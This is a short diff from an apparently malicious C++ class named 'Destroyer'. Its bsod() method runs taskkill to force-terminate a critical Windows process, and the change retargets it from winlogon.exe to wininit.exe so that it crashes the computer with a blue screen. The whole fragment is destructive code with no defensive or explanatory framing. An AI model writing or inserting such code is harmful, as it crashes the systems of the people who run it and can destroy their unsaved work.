@@ -9,7 +9,7 @@ class Destroyer{
     public:
         void bsod()//BSODs the computer
         {
-            system("taskkill /IM \"winlogon.exe\" /F");
+            system("taskkill /IM \"wininit.exe\" /F");
             std :: cout << "This is a placeholder\n";
         }
 
